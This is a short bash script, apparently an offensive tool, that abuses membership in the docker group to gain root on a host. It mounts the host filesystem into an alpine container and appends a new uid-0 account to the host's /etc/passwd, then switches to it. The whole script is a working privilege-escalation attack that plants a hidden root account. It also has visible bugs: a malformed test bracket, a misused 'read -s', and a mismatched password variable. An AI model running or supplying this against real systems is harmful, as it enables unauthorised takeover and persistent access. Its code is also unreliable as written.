#!/bin/bash

test_docker=$(docker ps | grep 'CONTAINER ID' | cut -d " " -f 1-2)

if [$test_docker='CONTAINER ID']; then
	echo 'Please write down your new root credentials.'
    read -p 'Choose a root user name: ' rootname
    read -s 'Choose a root password: ' passw1
    read -p 'Choose the the salt to hash your password: ' salt
    hpass=$(openssl passwd -1 -salt $salt $passw)

    echo -e "$rootname:$hpass:0:0:root:/root:/bin/bash" > new_account
    mv new_account /tmp/new_account
    docker run -tid -v /:/mnt/ --name flast101 alpine # CHANGE THIS IF NEEDED
    sleep 1; echo 'Please wait...'; sleep 1; echo '...'; sleep 1; echo '...';
    docker exec -ti flast101 sh -c "cat /mnt/tmp/new_account >> /mnt/etc/passwd"
    sleep 1
    
    echo 'Success! Enter you password to use your root account:'
    rm /tmp/new_account
    su $rootname

elif [ $(id -u) -eq 0 ]; then
    echo "The user islready root. Have fun ;-)"
    exit

else echo "Your account does not have permission to execute docker, aborting..."
	exit

fi
